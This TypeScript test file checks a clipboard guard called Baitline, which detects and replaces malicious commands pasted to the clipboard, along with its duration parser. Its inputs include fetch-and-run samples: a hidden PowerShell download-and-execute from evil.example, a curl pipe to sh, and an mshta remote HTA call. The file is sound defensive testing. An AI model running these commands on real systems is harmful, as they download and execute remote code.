import { test } from "node:test";
import assert from "node:assert/strict";
import { blockedText, handleClipboard, parseDuration } from "../src/guard.ts";

function deps(over: Partial<Parameters<typeof handleClipboard>[1]> = {}) {
  const writes: string[] = [];
  return { writes, d: { write: (t: string) => void writes.push(t), paused: () => false, dryRun: false, ...over } };
}

test("malicious clipboard is overwritten with an explanation", () => {
  const { d, writes } = deps();
  const v = handleClipboard("powershell -w hidden -c \"iex(irm http://evil.example/x)\"", d);
  assert.equal(v?.rule, "powershell-hidden");
  assert.equal(writes.length, 1);
  assert.match(writes[0]!, /Baitline blocked/);
  assert.match(writes[0]!, /hidden window/);
});

test("benign clipboard is untouched", () => {
  const { d, writes } = deps();
  assert.equal(handleClipboard("meeting moved to 3pm", d), null);
  assert.equal(writes.length, 0);
});

test("paused guard lets the paste through", () => {
  const { d, writes } = deps({ paused: () => true });
  assert.equal(handleClipboard("curl https://x.example/i.sh | sh", d), null);
  assert.equal(writes.length, 0);
});

test("dry run reports but does not touch the clipboard", () => {
  const { d, writes } = deps({ dryRun: true });
  assert.equal(handleClipboard("mshta https://evil.example/a.hta", d)?.rule, "mshta-remote");
  assert.equal(writes.length, 0);
});

test("blocked text explains itself and how to override", () => {
  const t = blockedText({ rule: "x", why: "because" });
  assert.match(t, /because/);
  assert.match(t, /guard pause/);
});

test("parseDuration", () => {
  assert.equal(parseDuration("90s"), 90_000);
  assert.equal(parseDuration("2m"), 120_000);
  assert.equal(parseDuration("1h"), 3_600_000);
  assert.equal(parseDuration("5"), 300_000);
  assert.throws(() => parseDuration("soon"));
});
